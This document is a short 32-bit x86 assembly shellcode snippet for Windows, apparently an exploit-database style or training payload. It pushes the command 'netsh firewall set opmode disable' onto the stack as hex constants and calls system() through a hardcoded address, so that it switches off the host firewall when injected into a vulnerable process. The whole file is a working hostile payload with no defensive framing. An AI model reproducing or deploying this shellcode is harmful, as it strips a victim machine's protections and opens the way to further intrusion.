[BITS 32]

global _start			

section .text
_start:

    xor edx, edx	; zero out edx
    push edx		; push null byte onto stack
   
    ; 'netsh firewall set opmode disable   '
    push 0x20202065
    push 0x6c626173
    push 0x69642065
    push 0x646f6d70
    push 0x6f207465
    push 0x73206c6c
    push 0x61776572
    push 0x69662068
    push 0x7374656e 

    mov ebx, esp	; save stack pointer 

    push ebx		; push pointer to command 
    mov edx, 0x77c293c7	; mov address of system
    call edx
